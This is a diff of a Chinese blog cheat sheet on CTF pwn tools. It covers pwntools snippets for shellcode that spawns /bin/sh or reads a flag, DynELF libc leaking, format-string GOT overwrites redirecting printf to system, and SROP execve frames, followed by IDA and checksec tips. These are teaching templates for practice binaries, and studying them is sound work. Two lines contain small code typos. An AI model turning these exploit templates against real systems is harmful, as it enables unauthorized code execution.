class="string">&quot;read&quot;</span>]  <span class="comment"># 获取read函数地址</span></span><br><span class="line">read_plt = pro.plt[<span class="string">&quot;read&quot;</span>]       <span class="comment"># 获取read的plt表地址，内容等于symbols[&quot;read&quot;]</span></span><br><span class="line">read_got = pro.got[<span class="string">&quot;read&quot;</span>]       <span class="comment"># 获取read的got表地址</span></span><br><span class="line"><span class="comment"># search的参数为字节类型</span></span><br><span class="line"><span class="comment"># 获取字符串的位置</span></span><br><span class="line">str_addr = <span class="built_in">next</span>(pro.search(<span class="string">b&quot;str&quot;</span>))</span><br><span class="line"></span><br><span class="line">read_offset = libc.symbols[<span class="string">&quot;read&quot;</span>]  <span class="comment"># 获取libc中read的固定偏移值</span></span><br><span class="line">bin_sh = <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>)) <span class="comment"># 获取/bin/sh的位置</span></span><br></pre></td></tr></table></figure>
-
-<p>shellcode的生成</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 32位的shellcode</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置上下文</span></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">code = shellcraft.sh()  <span class="comment"># 汇编代码</span></span><br><span class="line">code = asm(code)        <span class="comment"># opcode，payload中都使用这个</span></span><br></pre></td></tr></table></figure>
-
+<p>设置上下文环境 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 设置上下文环境主要用于一些需要上下文的漏洞利用</span></span><br><span class="line"><span class="comment"># 比如：shellcode的生成</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置操作系统</span></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line"><span class="comment"># 设置32位的体系架构 </span></span><br><span class="line">context.arch = <span class="string">&quot;i386&quot;</span></span><br><span class="line"><span class="comment"># 设置64位的体系架构</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment"># 打印交互中的输入和输出</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment"># 也可以直接这样写</span></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, lod_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 清空之前的上下文</span></span><br><span class="line">context.clear()</span><br><span class="line"><span class="comment"># 清空之前的上下文并设置为64位的体系架构</span></span><br><span class="line">context.clear(arch=<span class="string">&quot;amd64&quot;</span>)</span><br></pre></td></tr></table></figure></p>
+<p>获取程序输出 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p.recv()        <span class="comment"># 默认接受最大为4096字节的输出</span></span><br><span class="line">p.recvline()    <span class="comment"># 接受程序的一行输出</span></span><br><span class="line">p.recvall()     <span class="comment"># 接受程序的当前全部输出，直到遇到EOF</span></span><br><span class="line"><span class="comment">### 直到接收到\n为止，drop=True表示丢弃\n，buf为接收到的输出但不包括丢弃的\n</span></span><br><span class="line">buf = p.recvuntil(<span class="string">&quot;\n&quot;</span>, drop=<span class="literal">True</span>)   </span><br></pre></td></tr></table></figure></p>
+<p>payload的构造 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pad = cyclic(<span class="number">0x10</span>)</span><br><span class="line"><span class="comment"># 可以用上面的代码替代传统的构造方式 pad = b&quot;A&quot; * 0x10</span></span><br><span class="line"><span class="comment"># 其结果为 b&#x27;aaaabaaacaaadaaa&#x27;</span></span><br><span class="line">offset = cyclic_find(<span class="string">b&quot;daaa&quot;</span>)  <span class="comment"># 找到当前pad的偏移值</span></span><br></pre></td></tr></table></figure></p>
+<p>实现输入 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = b&#x27;hello!&#x27;      # python3，payload为字节类型</span><br><span class="line">p.sendline(payload)      # 输入hello! + \n</span><br><span class="line">p.send(payload)          # 输入hello!</span><br><span class="line">p.sendafter(&quot;test&quot;, payload)      # 在接受到test后才发送payload</span><br><span class="line">p.sendlineafter(&quot;test&quot;, payload)  # 在接受到test后才发送payload + \n</span><br></pre></td></tr></table></figure></p>
+<p>实现交互 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 开启和程序交互的终端</span></span><br><span class="line"><span class="comment"># 一般用于获取到shell的情况</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
+<p>获取程序或者libc中的信息 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">pro = ELF(<span class="string">&quot;./program&quot;</span>)  <span class="comment"># 加载样本</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc&quot;</span>)    <span class="comment"># 加载libc</span></span><br><span class="line"></span><br><span class="line">read_addr = pro.symbols[<span class="string">&quot;read&quot;</span>]  <span class="comment"># 获取read函数地址</span></span><br><span class="line">read_plt = pro.plt[<span class="string">&quot;read&quot;</span>]       <span class="comment"># 获取read的plt表地址，内容等于symbols[&quot;read&quot;]</span></span><br><span class="line">read_got = pro.got[<span class="string">&quot;read&quot;</span>]       <span class="comment"># 获取read的got表地址</span></span><br><span class="line"><span class="comment"># search的参数为字节类型</span></span><br><span class="line"><span class="comment"># 获取字符串的位置</span></span><br><span class="line">str_addr = <span class="built_in">next</span>(pro.search(<span class="string">b&quot;str&quot;</span>))</span><br><span class="line"></span><br><span class="line">read_offset = libc.symbols[<span class="string">&quot;read&quot;</span>]  <span class="comment"># 获取libc中read的固定偏移值</span></span><br><span class="line">bin_sh = <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>)) <span class="comment"># 获取/bin/sh的位置</span></span><br></pre></td></tr></table></figure></p>
+<p>shellcode的生成 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 32位的shellcode</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置上下文</span></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">code = shellcraft.sh()  <span class="comment"># 汇编代码</span></span><br><span class="line">code = asm(code)        <span class="comment"># opcode，payload中都使用这个</span></span><br></pre></td></tr></table></figure></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 64位的shellcode</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置上下文</span></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">code = shellcraft.sh()  <span class="comment"># 同上</span></span><br><span class="line">code = asm(code)        <span class="comment"># 同上</span></span><br></pre></td></tr></table></figure>
-
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 上面是执行execve(&quot;/bin/sh\x00&quot;)的shellcode</span></span><br><span class="line"><span class="comment"># 下面展示直接读取flag文件然后打印的shellcode</span></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line">mmap = <span class="number">0x12345678</span>  <span class="comment"># 可读可写内存区域</span></span><br><span class="line"></span><br><span class="line">code = shellcraft.<span class="built_in">open</span>(<span class="string">&quot;./flag&quot;</span>)</span><br><span class="line">code += shellcraft.read(<span class="number">3</span>, mmap, <span class="number">0x50</span>)</span><br><span class="line">code += shellcrafr.write(<span class="number">1</span>, mmap, <span class="number">0x50</span>)</span><br><span class="line">code = asm(code)</span><br></pre></td></tr></table></figure>
-
-
-<p>DynELF泄露libc</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下面展示的是DynELF的使用模板</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">pro = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span></span><br><span class="line">	<span class="comment"># 这里的代码比较抽象</span></span><br><span class="line">	<span class="comment"># 其实目的就是利用能够回显字符的函数泄露addr，返回地址为start</span></span><br><span class="line">	<span class="comment"># data接受的数据只能是回显的addr地址上的内容，将空字符处理为\x00</span></span><br><span class="line">	payload = padding + addr + start</span><br><span class="line">	p.send(payload)</span><br><span class="line">	data = p.recv()</span><br><span class="line">	<span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造DynELF实例，第一个参数为leak函数，第二个为题目的ELF对象</span></span><br><span class="line">d = DynELF(leak, elf=pro)</span><br><span class="line">system = d.lookup(<span class="string">&quot;system&quot;</span>, <span class="string">&quot;libc&quot;</span>)  <span class="comment"># 泄露出system的地址</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;system ====&gt; &quot;</span>, system, <span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 实战链接</span></span><br><span class="line"><span class="comment"># https://blog.csdn.net/A951860555/article/details/111638914</span></span><br><span class="line"><span class="comment"># 详细的用法讲解，包括write/puts/printf三个函数的用法和细节处理</span></span><br><span class="line"><span class="comment"># https://www.anquanke.com/post/id/85129</span></span><br></pre></td></tr></table></figure>
-
-
-
-<p>FmtStr格式化字符串</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 交互函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_fmt</span>(<span class="params">pad</span>):</span></span><br><span class="line">	p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">	p.sendline(pad)</span><br><span class="line">	info = p.recv()</span><br><span class="line">	<span class="keyword">return</span> info</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里可以和上面的DynELF类比</span></span><br><span class="line">fmt = FmtStr(exec_fmt)</span><br><span class="line">offset = fmt.offset  <span class="comment"># 获取偏移</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">pro = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">printf_got = pro.got[<span class="string">&quot;printf&quot;</span>]</span><br><span class="line">system_plt = pro.plt[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"><span class="comment"># 格式化payload构造函数</span></span><br><span class="line"><span class="comment"># 总共四个参数：</span></span><br><span class="line"><span class="comment"># offset --&gt; 偏移量</span></span><br><span class="line"><span class="comment"># writes --&gt; &#123;被覆盖的地址:要写入的地址&#125;</span></span><br><span class="line"><span class="comment"># numbwritten --&gt; 已经由printf函数写入的字节数，默认为0</span></span><br><span class="line"><span class="comment"># write_size --&gt; 逐byte/short/int写入，默认是byte，这样发送的字节少</span></span><br><span class="line">pad = fmtstr_payload(offset, &#123;printf_got:system_plt&#125;)</span><br><span class="line">p.send(pad)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 详细的介绍链接 + 例子</span></span><br><span class="line"><span class="comment"># https://blog.csdn.net/A951860555/article/details/115061803</span></span><br></pre></td></tr></table></figure>
-
-<p>SROP工具SigreturnFrame</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 64位</span></span><br><span class="line"><span class="comment"># sigreturn 代表可以触发sigreturn调用的地址</span></span><br><span class="line"><span class="comment"># 其gadgets如下，只要使rax = 0xf，然后进行系统调用</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x001 mov rax, 0Fh</span></span><br><span class="line"><span class="string">0x002 syscall</span></span><br><span class="line"><span class="string">0x003 ret</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">sigreturn = <span class="number">0x001</span></span><br><span class="line">syscall = <span class="number">0x002</span>  <span class="comment"># syscall gadget</span></span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = sh_addr  <span class="comment"># &quot;/bin/sh\x00&quot;</span></span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip = syscall</span><br><span class="line"></span><br><span class="line">pad = padding + <span class="built_in">bytes</span>(frame)  <span class="comment"># python3</span></span><br><span class="line">p.send(pad)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 32位注意以下几个方面</span></span><br><span class="line"><span class="comment"># 1、上下文初始化</span></span><br><span class="line"><span class="comment"># context.arch = &quot;i386&quot;</span></span><br><span class="line"><span class="comment"># frame = SigreturnFrame(kernel=&quot;i386&quot;)</span></span><br><span class="line"><span class="comment"># 2、frame.eax = xx  注意寄存器的名字</span></span><br><span class="line"><span class="comment"># 3、syscall指令在32位下可以找int 80</span></span><br></pre></td></tr></table></figure>
-<p>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/A951860555/article/details/110990925">https://blog.csdn.net/A951860555/article/details/110990925</a></p>
-<h1 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h1><p>新建选GO<br>将文件拖入</p>
-<img src="/2020/12/19/pwn%E7%94%A8%E5%88%B0%E7%9A%84%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/1.png" class>
-<p>得到汇编码</p>
-<p>找到入口点F5得到伪C代码（也许能看得懂）<br>shift+F12找出字符串（带””的内容，可能有重要内容）<br>双击函数、变量跳出所在位置</p>
-<p>菜单工具栏中View Toolbars下有两个子菜单，分别时Basci mode 和 Advanced mode<br>逆向工作区一般有7个子窗口：<br> IDA View-A 反汇编试图A<br> Hex View-A 16进制试图A<br> Functions Window 函数窗口<br> Structures 结构体<br> Enums 枚举<br> Imports 导入数据<br> Exports 导出数据</p>
-<p>IDA在静态分析时会自动分析已知和未知的函数，通常有如下几种标识：<br> Sub_XXXXX 子程序<br> loc_XXXXXX 地址，多用于跳转指令的目的地<br> byte_XXXXX 标识一个字节型的数据<br> word_XXXX 字型数据<br> dword_XXX 双字型数据<br> unk_XXXXX 未知类型数据</p>
+<p>DynELF泄露libc <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下面展示的是DynELF的使用模板</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">pro = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span></span><br><span class="line">	<span class="comment"># 这里的代码比较抽象</span></span><br><span class="line">	<span class="comment"># 其实目的就是利用能够回显字符的函数泄露addr，返回地址为start</span></span><br><span class="line">	<span class="comment"># data接受的数据只能是回显的addr地址上的内容，将空字符处理为\x00</span></span><br><span class="line">	payload = padding + addr + start</span><br><span class="line">	p.send(payload)</span><br><span class="line">	data = p.recv()</span><br><span class="line">	<span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造DynELF实例，第一个参数为leak函数，第二个为题目的ELF对象</span></span><br><span class="line">d = DynELF(leak, elf=pro)</span><br><span class="line">system = d.lookup(<span class="string">&quot;system&quot;</span>, <span class="string">&quot;libc&quot;</span>)  <span class="comment"># 泄露出system的地址</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;system ====&gt; &quot;</span>, system, <span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 实战链接</span></span><br><span class="line"><span class="comment"># https://blog.csdn.net/A951860555/article/details/111638914</span></span><br><span class="line"><span class="comment"># 详细的用法讲解，包括write/puts/printf三个函数的用法和细节处理</span></span><br><span class="line"><span class="comment"># https://www.anquanke.com/post/id/85129</span></span><br></pre></td></tr></table></figure></p>
+<p>FmtStr格式化字符串 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 交互函数</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_fmt</span>(<span class="params">pad</span>):</span></span><br><span class="line">	p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">	p.sendline(pad)</span><br><span class="line">	info = p.recv()</span><br><span class="line">	<span class="keyword">return</span> info</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里可以和上面的DynELF类比</span></span><br><span class="line">fmt = FmtStr(exec_fmt)</span><br><span class="line">offset = fmt.offset  <span class="comment"># 获取偏移</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">pro = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">printf_got = pro.got[<span class="string">&quot;printf&quot;</span>]</span><br><span class="line">system_plt = pro.plt[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"><span class="comment"># 格式化payload构造函数</span></span><br><span class="line"><span class="comment"># 总共四个参数：</span></span><br><span class="line"><span class="comment"># offset --&gt; 偏移量</span></span><br><span class="line"><span class="comment"># writes --&gt; &#123;被覆盖的地址:要写入的地址&#125;</span></span><br><span class="line"><span class="comment"># numbwritten --&gt; 已经由printf函数写入的字节数，默认为0</span></span><br><span class="line"><span class="comment"># write_size --&gt; 逐byte/short/int写入，默认是byte，这样发送的字节少</span></span><br><span class="line">pad = fmtstr_payload(offset, &#123;printf_got:system_plt&#125;)</span><br><span class="line">p.send(pad)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 详细的介绍链接 + 例子</span></span><br><span class="line"><span class="comment"># https://blog.csdn.net/A951860555/article/details/115061803</span></span><br></pre></td></tr></table></figure></p>
+<p>SROP工具SigreturnFrame <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 64位</span></span><br><span class="line"><span class="comment"># sigreturn 代表可以触发sigreturn调用的地址</span></span><br><span class="line"><span class="comment"># 其gadgets如下，只要使rax = 0xf，然后进行系统调用</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x001 mov rax, 0Fh</span></span><br><span class="line"><span class="string">0x002 syscall</span></span><br><span class="line"><span class="string">0x003 ret</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">sigreturn = <span class="number">0x001</span></span><br><span class="line">syscall = <span class="number">0x002</span>  <span class="comment"># syscall gadget</span></span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = sh_addr  <span class="comment"># &quot;/bin/sh\x00&quot;</span></span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip = syscall</span><br><span class="line"></span><br><span class="line">pad = padding + <span class="built_in">bytes</span>(frame)  <span class="comment"># python3</span></span><br><span class="line">p.send(pad)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 32位注意以下几个方面</span></span><br><span class="line"><span class="comment"># 1、上下文初始化</span></span><br><span class="line"><span class="comment"># context.arch = &quot;i386&quot;</span></span><br><span class="line"><span class="comment"># frame = SigreturnFrame(kernel=&quot;i386&quot;)</span></span><br><span class="line"><span class="comment"># 2、frame.eax = xx  注意寄存器的名字</span></span><br><span class="line"><span class="comment"># 3、syscall指令在32位下可以找int 80</span></span><br></pre></td></tr></table></figure> 原文链接：https://blog.csdn.net/A951860555/article/details/110990925</p>
+<h1 id="ida">IDA</h1>
+<p>新建选GO 将文件拖入 <img src="/2020/12/19/pwn%E7%94%A8%E5%88%B0%E7%9A%84%E5%B7%A5%E5%85%B7%E6%B1%87%E6%80%BB/1.png" class> 得到汇编码</p>
+<p>找到入口点F5得到伪C代码（也许能看得懂） shift+F12找出字符串（带""的内容，可能有重要内容） 双击函数、变量跳出所在位置</p>
+<p>菜单工具栏中View Toolbars下有两个子菜单，分别时Basci mode 和 Advanced mode 逆向工作区一般有7个子窗口： IDA View-A 反汇编试图A Hex View-A 16进制试图A Functions Window 函数窗口 Structures 结构体 Enums 枚举 Imports 导入数据 Exports 导出数据</p>
+<p>IDA在静态分析时会自动分析已知和未知的函数，通常有如下几种标识： Sub_XXXXX 子程序 loc_XXXXXX 地址，多用于跳转指令的目的地 byte_XXXXX 标识一个字节型的数据 word_XXXX 字型数据 dword_XXX 双字型数据 unk_XXXXX 未知类型数据</p>
 <p>跳转至某个位置，快捷键G</p>
-<p>一个程序运行先存放在内存中<br>IDA分析寄存器地址（CPU），内存地址（内存）的数据完成反汇编    </p>
-<p>IDA解析数据和代码之间的转换<br>很多程序为了防止被破解，加入了花指令。所谓花指令，是在代码中插入了数据使得反汇编引擎错误的将数据解析成为代码，因此从错误解析的位置开始往后的汇编代码都会被错误的解析。它是一种常用的对抗静态分析的手段。<br>如果逆向者发现IDA错误地将代码解析成为了数据或者错误地将数据解析成为了代码，可以通过快捷键“C”和快捷键“D”，在数据和代码之间解析。</p>
-<p>int_64分为两种储存方式（存进内存）<br>大端存储<br>ABCDEFG<br>小端存储<br>GFEDCBA</p>
-<p>遇到大数据+0LL后缀可能是没被转化的原进制数，因为花指令的干扰。<br>选中数据按R键转化</p>
-<p>右键copy to assmbly<br>将伪代码一行一行翻译成汇编码</p>
-<h1 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h1><p>checksec是一个脚本软件，也就是用脚本写的一个文件，不到2000行，可用来学习shell。<br>checksec是用来检查可执行文件属性，例如PIE, RELRO, PaX, Canaries, ASLR, Fortify Source等等属性。<br>checksec的使用方法：<br>checksec –file /usr/sbin/sshd</p>
+<p>一个程序运行先存放在内存中 IDA分析寄存器地址（CPU），内存地址（内存）的数据完成反汇编</p>
+<p>IDA解析数据和代码之间的转换 很多程序为了防止被破解，加入了花指令。所谓花指令，是在代码中插入了数据使得反汇编引擎错误的将数据解析成为代码，因此从错误解析的位置开始往后的汇编代码都会被错误的解析。它是一种常用的对抗静态分析的手段。 如果逆向者发现IDA错误地将代码解析成为了数据或者错误地将数据解析成为了代码，可以通过快捷键“C”和快捷键“D”，在数据和代码之间解析。</p>
+<p>int_64分为两种储存方式（存进内存） 大端存储 ABCDEFG 小端存储 GFEDCBA</p>
+<p>遇到大数据+0LL后缀可能是没被转化的原进制数，因为花指令的干扰。 选中数据按R键转化</p>
+<p>右键copy to assmbly 将伪代码一行一行翻译成汇编码</p>
+<h1 id="checksec">checksec</h1>
+<p>checksec是一个脚本软件，也就是用脚本写的一个文件，不到2000行，可用来学习shell。 checksec是用来检查可执行文件属性，例如PIE, RELRO, PaX, Canaries, ASLR, Fortify Source等等属性。 checksec的使用方法： checksec –file /usr/sbin/sshd</p>
